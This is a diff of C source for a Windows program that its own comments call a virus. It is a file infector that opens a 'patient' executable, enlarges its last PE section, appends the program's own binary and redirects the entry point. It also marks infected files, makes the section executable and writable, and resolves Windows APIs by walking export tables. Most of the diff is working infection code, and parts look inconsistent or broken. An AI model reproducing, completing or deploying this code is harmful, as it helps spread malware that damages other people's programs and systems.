@@ -1,7 +1,12 @@
-//#include <Windows.h>
+#include <Windows.h>
 #include <stdio.h>
 #include <conio.h>
 
+#pragma comment(linker,"/MERGE:.rdata=.text")
+#pragma comment(linker,"/FILEALIGN:512")
+#pragma comment(linker,"/SECTION:.text,EWR /IGNORE:4078")
+#pragma comment(linker,"/ENTRY:main")
+/*
 typedef wchar_t WCHAR;
 typedef WCHAR *LPWSTR;
 typedef unsigned char BYTE;
@@ -25,17 +30,9 @@ typedef CHAR *LPSTR;
 typedef const CHAR *LPCSTR;
 typedef void *PVOID;
 
-#define NTSIGNATURE(a) ((LPVOID)((DWORD *)a + 0x3c))
-#define GETSIZEOFHEADERS(a) (*((DWORD*)(a + 0x54)))
-#define ALIGN_DOWN(x, align) (x & ~(align - 1))
-#define ALIGN_UP(x, align) ((x & (align - 1))?ALIGN_DOWN(x,align)+align:x)
-#define OPT_SZ(p) (*((WORD*)(p + 0x14)))
-#define NumOfSec(p) (*(WORD*)(p + 0x6))
-#define pSectionTable(p) ((BYTE*)(p + 0x18 + OPT_SZ(p)))
-#define pLastSection(p) (pSectionTable(p) + (NumOfSec(p) - 1) * 0x28)
-
 #define IMAGE_NT_SIGNATURE 0x00004550
-#define MAX_PATH 260
+#define MAX_PATH 250
+#define NULL 0
 
 typedef struct _FILETIME {
   DWORD dwLowDateTime;
@@ -74,12 +71,25 @@ typedef struct _OVERLAPPED {
   HANDLE    hEvent;
 } OVERLAPPED, *LPOVERLAPPED;
 
+typedef struct HWND__ {int unused;};
+typedef struct HWND__ *HWND;
+*/
+#define NTSIGNATURE(a) ((LPVOID)(*((DWORD *)(a + 0x3c)) + a))
+#define GETSIZEOFHEADERS(a) (*((DWORD*)(a + 0x54)))
+#define ALIGN_DOWN(x, align) (x & ~(align - 1))
+#define ALIGN_UP(x, align) ((x & (align - 1))?ALIGN_DOWN(x,align)+align:x)
+#define OPT_SZ(p) (*((WORD*)(p + 0x14)))
+#define NumOfSec(p) (*(WORD*)(p + 0x6))
+#define pSectionTable(p) ((BYTE*)(p + 0x18 + OPT_SZ(p)))
+#define pLastSection(p) (pSectionTable(p) + (NumOfSec(p) - 1) * 0x28)
+
 wchar_t* CharToWchar(char*);
 char* WcharToChar(wchar_t*);
 bool FindFiles();
 DWORD FindFuncs(char *);
 int StrCmp(char*, char*);
 void GetAPIs();
+int WcsCat(wchar_t *, wchar_t *);
 
 
 
@@ -97,7 +107,8 @@ BOOL (__stdcall *find_next_file)(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileD
 BOOL (__stdcall *find_close)(HANDLE hFindFile);
 int (__stdcall *mb_to_wc)(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
 int (__stdcall *wc_to_mb)(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
-wchar_t* (__cdecl *wcs_cat)(wchar_t *strDestination, const wchar_t *strSource);
+int (__stdcall *message_box)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);
+void (__stdcall *exit_process)(UINT);
 
 int main(int argc, char *argv[])
 {
@@ -109,11 +120,11 @@ int main(int argc, char *argv[])
 	//HANDLE hFind = FindFirstFile(CharToWchar(chStr), &FindFileData);
 	long w;
 	GetAPIs();
-	/*HANDLE hfPat = create_file(CharToWchar(chStr), 0xC0000000, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-	if(hfPat == INVALID_HANDLE_VALUE) {printf("Open file error!"); close_handle(hfPat); return 0; }
-	w = set_file_pointer(hfPat, 0,0,FILE_END);
+	HANDLE hfPat = create_file(CharToWchar(chStr), 0xC0000000, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
+	if((DWORD)hfPat == 0xffffffff) {printf("Open patient file error!"); close_handle(hfPat); return 0; }
+	w = set_file_pointer(hfPat, 0,0, 2); //FILE_END 2
 
-	HANDLE hMap = create_file_mapping(hfPat, NULL, PAGE_READWRITE, 0, w, NULL);
+	HANDLE hMap = create_file_mapping(hfPat, NULL, 0x04, 0, w, NULL); //PAGE_READWRITE 0x04
 	if(hMap==NULL) {printf("error - hMap"); close_handle(hfPat); return 0; }
 	BYTE* hMapAddress = (BYTE*) map_view_of_file(hMap, 0x02, 0, 0, w);
 	if(!hMapAddress) {printf("error - hMapAddress");return 0;}
@@ -122,18 +133,19 @@ int main(int argc, char *argv[])
 
 	if(*((DWORD*)(hPE)) == IMAGE_NT_SIGNATURE) printf("\nsucces");
 	else printf("\nerror PE");
-	//if(*((DWORD*)(hPE + 0x4C)) == 0x45673) {MessageBox(0,CharToWchar("virus"),CharToWchar("My first virus"),0); ExitProcess(NULL); }
 
-	DWORD AEP_PAT = *((DWORD*)(hPE + 0x28)), FA = *((DWORD*)(hPE + 0x3C)), IB = *((DWORD*)(hPE + 0x34));
-
+	DWORD AEP_PAT = *((DWORD*)(hPE + 0x28)), FA = *((DWORD*)(hPE + 0x3C)), IB = *((DWORD*)(hPE + 0x34)), SA = *((DWORD*)(hPE + 0x38));
 	
 	//Virus
-	HANDLE hfVir = create_file(CharToWchar(argv[0]), 0x80000000, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-	if(hfVir == INVALID_HANDLE_VALUE) {printf("Open vir file error!"); close_handle(hfVir); return 0; }
-	w = set_file_pointer(hfVir, 0,0,FILE_END);
-	HANDLE hMapVir = create_file_mapping(hfVir, NULL, PAGE_READONLY, 0, w, NULL);
+	wchar_t m[MAX_PATH];
+	GetModuleFileName(NULL, m, MAX_PATH);
+	HANDLE hfVir = create_file(m, 0x80000000, 0x00000001, NULL, 3, 0x00000080, 0);
+	if((DWORD)hfVir == 0xffffffff) {printf("Open vir file error!"); close_handle(hfVir); return 0; }
+	DWORD vir_sz;
+	vir_sz = set_file_pointer(hfVir, 0, 0, 2); //FILE_END 2
+	HANDLE hMapVir = create_file_mapping(hfVir, NULL, 0x02, 0, vir_sz, NULL); //PAGE_READONLY 0x02
 	if(hMapVir == NULL) {printf("error - hMap Vir"); close_handle(hfVir); return 0; }
-	BYTE* hMapAddressVir = (BYTE*) map_view_of_file(hMapVir, 0x04, 0, 0, w);
+	BYTE* hMapAddressVir = (BYTE*) map_view_of_file(hMapVir, 0x04, 0, 0, vir_sz);
 	if(!hMapAddressVir) {printf("error - hMapAddress Vir"); return 0;}
 
 	BYTE* hPEVir = (BYTE*)NTSIGNATURE(hMapAddressVir);
@@ -141,50 +153,58 @@ int main(int argc, char *argv[])
 	if(*((DWORD*)(hPEVir)) == IMAGE_NT_SIGNATURE) printf("\nsucces Vir");
 	else printf("\nerror PEVir");
 
-	DWORD AEP_VIR = *((DWORD*)(hPE + 0x28)), IS_VIR = *((DWORD*)(hPE + 0x50));
+	DWORD AEP_VIR = *((DWORD*)(hPEVir + 0x28)), IS_VIR = *((DWORD*)(hPEVir + 0x50));
 	
 	// Infection
-
+	if(*((DWORD*)(hPE + 0x4C)) == 0x45673) {MessageBox(0,CharToWchar("virus"),CharToWchar("My first virus"),0); exit_process(NULL); }
+	else
+	{
 	BYTE* hLS = pLastSection(hPE);
+	DWORD charLS = *((DWORD*)(hLS + 0x24));	
 	//printf("Attributes = %x",*((DWORD*)(hLS + 0x24)));
 	DWORD szRD = *((DWORD*)(hLS + 0x10)), newszRD = 0;
-	newszRD = szRD + IS_VIR;
-	newszRD = ALIGN_UP(newszRD, FA);
-	*((DWORD*)(hLS + 0x10)) = newszRD;
-	*((DWORD*)(hLS + 0x8)) = newszRD;
-
+	newszRD = szRD + vir_sz;
+	//newszRD = ALIGN_UP(newszRD, FA);
+	*((DWORD*)(hLS + 0x10)) = ALIGN_UP(newszRD, FA);
+	DWORD dd = *((DWORD*)(hLS + 0x8));
+	*((DWORD*)(hLS + 0x8)) = ALIGN_UP(newszRD,SA);
 	DWORD ptrEndLS = szRD + *((DWORD*)(hLS + 0x14));
+	/*
+	w = set_file_pointer(hfPat, 0,0, 2);
+	printf("sz_x = %x, R_sz_before = %x, R_sz_after = %x, V_sz_bef = %x, V_sz_aftr = %x, ptr = %x, File size = %x",vir_sz,szRD, *((DWORD*)(hLS + 0x10)),dd,*((DWORD*)(hLS + 0x8)),ptrEndLS, w);
+	*/
 	DWORD newAEP = szRD + *((DWORD*)(hLS + 0x0C));
-	//*((DWORD*)(hPE + 0x28)) = newAEP + AEP_VIR;
-	*((DWORD*)(hPE + 0x50)) = *((DWORD*)(hLS + 0x0C)) + newszRD;
-	*((DWORD*)(hLS + 0x24)) = 0xA0000020;
+	*((DWORD*)(hPE + 0x28)) = newAEP;
+	
+	
+	// vnedrenie
+		set_file_pointer(hfPat, ptrEndLS, 0, 0); //FILE_BEGIN 0
+		set_file_pointer(hfVir, 0, 0, 0);
 
-	//*((DWORD*)(hPE + 0x4C)) = 0x45673;
-
-	set_file_pointer(hfPat, ptrEndLS, 0,FILE_BEGIN);
-	set_file_pointer(hfVir, 0, 0,FILE_BEGIN);
-
-	DWORD wr;
-	unsigned char buf[1024];
-	while(1)
-	{
-		read_file(hfVir,buf, 1024, &wr, NULL);
-		write_file(hfPat, buf, wr, &wr, NULL);
-		if(wr < 1024) break;
-	};
+		DWORD wr;
+		unsigned char buf[1024];
+		while(1)
+		{
+			read_file(hfVir,buf, 1024, &wr, NULL);
+			write_file(hfPat, buf, wr, &wr, NULL);
+			if(wr < 1024) break;
+		};
+		*((DWORD*)(hPE + 0x4C)) = 0x45673;
+		/*
+		w = set_file_pointer(hfPat, 0,0, 2);
+		printf("\nnews = %x, newsalign = %x, filesz = %x",newszRD, ALIGN_UP(newszRD,FA), w);
+		*/
+		*((DWORD*)(hLS + 0x24)) = 0xA0000020;
+		*((DWORD*)(hPE + 0x50)) = *((DWORD*)(hLS + 0x0C)) + ALIGN_UP(newszRD,SA);
+	}
+	
 	//*((DWORD*)(hPE + 0x34 + ptrEndLS)) = ptrEndLS;
-	//Close Handles
 	
 	unmap_view_of_file(hMapAddress);
 	close_handle(hfPat);
 	unmap_view_of_file(hMapAddressVir);
 	close_handle(hfVir);
 	//if (!FindFiles()) return 0;
-	getch();
-	*/
-	//closeH = CloseHandle;
-	//close_handle(hfPat);
-	FindFiles();
 	getch();
 	return 1;	
 
@@ -197,6 +217,7 @@ wchar_t* CharToWchar(char *temp)
 		len++;
 	wchar_t *wStr = new wchar_t[len + 1];
 	mb_to_wc(0, NULL, temp, -1, wStr, len);
+	wStr[len] = 0;
 	return wStr;
 }
 
@@ -223,9 +244,9 @@ bool FindFiles()
 
 	
 	get_current_directory(BufSize, DirSpec);
-    printf ("\nTarget directory is %s\n", WcharToChar(DirSpec));
+  //  printf ("\nTarget directory is %s\n", WcharToChar(DirSpec));
     //strncpy (DirSpec, path, strlen(path)+1);
-    wcs_cat(DirSpec, CharToWchar("\\*"));
+    WcsCat(DirSpec, CharToWchar("\\*"));
 
     hFind = find_first_file(DirSpec, &FindFileData);
 
@@ -236,10 +257,10 @@ bool FindFiles()
     } 
     else 
     {*/
-		printf ("First file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
+		//printf ("First file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
        while (find_next_file(hFind, &FindFileData) != 0) 
        {
-          printf ("Next file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
+         // printf ("Next file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
        }
     
    //    dwError = GetLastError();
@@ -310,7 +331,7 @@ DWORD FindFuncs(char *f_name)
 			printf("% 20s [%03d/%03d] %08Xh %s\n",
 			name, ordinal, i, f_address, (pForward)?(char*)pForward:"");
 		printf("----------------------------------------------------");*/
-		if(ind) return (f_address);
+		if(ind) {printf("addr = %x",f_address);return (f_address);}
 	}
 	return 0;
 }
@@ -331,7 +352,8 @@ void GetAPIs()
 	find_first_file = (HANDLE (__stdcall *)(LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData))FindFuncs("FindFirstFileW");
 	find_next_file = (BOOL (__stdcall *)(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData))FindFuncs("FindNextFileW");
 	find_close = (BOOL (__stdcall *)(HANDLE hFindFile))FindFuncs("FindClose");
-	wcs_cat = (wchar_t* (__cdecl *)(wchar_t *strDestination, const wchar_t *strSource))FindFuncs("wcscat");
+	message_box = (int (__stdcall *)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType))FindFuncs("MESSAGEBOX");
+	exit_process = (void (__stdcall *)(UINT))FindFuncs("ExitProcess");
 }
 
 int StrCmp(char *str1, char *str2)
@@ -340,4 +362,13 @@ int StrCmp(char *str1, char *str2)
 	while((str1[i] == str2[i]) && (str1[i] != '\0')) i++;
 	if(str1[i] == '\0') return 0;
 	else return 1;
+}
+
+int WcsCat(wchar_t *dest, wchar_t *source)
+{
+	int i= 0, j = 0;
+	while(dest[i]) i++;
+	while(source[j]) {dest[i] = source[j]; j++; i++;}
+	dest[i] = 0;
+	return 1;
 }
